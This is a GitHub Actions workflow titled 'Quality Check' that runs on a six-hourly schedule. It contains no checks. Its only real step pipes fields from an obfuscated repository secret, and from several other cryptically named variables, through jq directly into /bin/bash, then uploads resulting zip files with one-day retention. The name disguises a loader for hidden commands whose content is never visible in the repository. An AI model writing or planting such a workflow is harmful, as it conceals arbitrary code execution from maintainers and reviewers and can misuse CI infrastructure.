name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '29 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Begin
        env:
          jsto08: ${{ secrets.jsto08 }}
        run: |
          printf '%s' "$jsto08" | jq -r .hpgnw870 | /bin/bash
          echo $nn1197 | jq -r .nuoow64 | /bin/bash
          printf '%s' "$ubty7677" | jq -r .tkjhq94 | /bin/bash
          printf '%s' "$aaf5" | jq -r .x8288 | /bin/bash
          echo $h43830 | jq -r .uvvd8 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: AnKuBl6w
          path: "*.zip"
          retention-days: 1
